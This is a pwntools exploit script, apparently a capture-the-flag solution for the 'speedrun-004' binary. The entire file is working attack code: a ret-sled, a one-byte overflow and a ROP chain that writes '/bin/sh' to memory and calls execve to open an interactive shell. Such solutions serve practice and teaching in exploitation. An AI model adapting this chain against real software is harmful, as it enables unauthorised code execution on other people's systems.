from pwn import * 

p=process("./speedrun-004")


#####WORK LIKE NOP SLEED######################
ret = 0x400416                #: ret



#######GADGETS ROP CHAIN#######################
pop_rax = 0x415f04            #: pop rax ; ret
pop_rdi = 0x400686            #: pop rdi ; ret
pop_rsi = 0x410a93            #: pop rsi ; ret
pop_rdx = 0x44a155            #: pop rdx ; ret
syscall = 0x40132c            #: syscall

###########GADGET INSERT /BIN/SH###############
mov_gadget = 0x418c37         #: mov qword ptr [rdx], rax ; ret
memory_addr = 0x6b6030        #: memory
bin_sh = 0x0068732f6e69622f     # "/bin/sh".encode('hex')

##############PUT BINSH INTO MEMORY############
rop = ''

rop += p64(pop_rdx)
rop += p64(memory_addr)
rop += p64(pop_rax)
rop += p64(bin_sh)
rop += p64(mov_gadget)

##############EXECV('/bin/sh',0,0)############################
rop += p64(pop_rax)
rop += p64(0x3b)
rop += p64(pop_rdi)
rop += p64(memory_addr)
rop += p64(pop_rsi)
rop += p64(0x0)
rop += p64(pop_rdx)
rop += p64(0x0)
rop += p64(syscall)

##\x00 overwrite last byte  
payload = p64(ret) * ((256-len(rop)) / 8) + rop + "\x00" #/8 -> p64(ret)=8 


p.recvuntil("how much do you have to say?")
p.sendline("257")
p.recvuntil("Ok, what do you have to say for yourself?")
p.sendline(payload)
p.interactive()

